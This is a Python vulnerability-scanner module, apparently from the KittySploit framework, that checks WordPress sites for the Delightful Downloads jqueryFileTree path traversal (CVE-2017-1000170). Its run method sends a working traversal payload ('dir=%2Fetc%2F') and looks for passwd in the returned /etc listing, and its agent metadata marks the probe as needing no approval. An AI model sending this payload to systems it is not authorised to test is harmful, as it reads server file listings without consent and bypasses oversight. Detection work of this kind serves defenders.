#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Delightful Downloads Jquery File Tree versions 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Delightful Downloads Jquery File Tree 2.1.5 - Local File Inclusion Detection',
        'description': 'WordPress Delightful Downloads Jquery File Tree versions 2.1.5 and older are susceptible to local file inclusion vulnerabilities via jqueryFileTree.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2017',
            'wordpress',
            'wp-plugin',
            'lfi',
            'jquery',
            'edb',
            'packetstorm',
            'jqueryfiletree_project',
            'vkev',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/49693',
            'https://github.com/jqueryfiletree/jqueryfiletree/issues/66',
            'http://packetstormsecurity.com/files/161900/WordPress-Delightful-Downloads-Jquery-File-Tree-1.6.6-Path-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-1000170',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2017-1000170',
    }

    def run(self):
        path = '/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='dir=%2Fetc%2F&onlyFiles=true')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ("<li class='file ext_passwd'>", "<a rel='/passwd'>passwd</a></li>",)
        if all(m in body for m in body_all):
            self.set_info(
                severity='high',
                reason='WordPress Delightful Downloads Jquery File Tree 2.1.5 - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

